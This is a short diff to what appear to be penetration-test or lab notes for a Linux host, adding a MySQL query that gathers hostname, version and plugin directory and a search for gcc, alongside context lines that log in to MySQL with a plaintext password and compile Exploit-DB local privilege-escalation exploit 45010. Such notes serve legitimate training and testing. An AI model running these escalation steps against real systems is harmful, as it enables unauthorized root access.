@@ -199,6 +199,7 @@ sudo netstat -tulpn
 mysql --host=127.0.0.1 --port=13306 --user=wp -pLv9EVQq86cfi8ioWsqFUQyU
 
 SHOW Grants;
+select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;
 
 show variables like 'hostname';
 show variables like 'plugin_dir';
@@ -281,6 +282,8 @@ uname -a
 searchsploit ubuntu 16.04
 
 cp /usr/share/exploitdb/exploits/linux/local/45010.c ./
+
+find / -name gcc -type f 2>/dev/null
 
 gcc 45010.c -o 45010
 
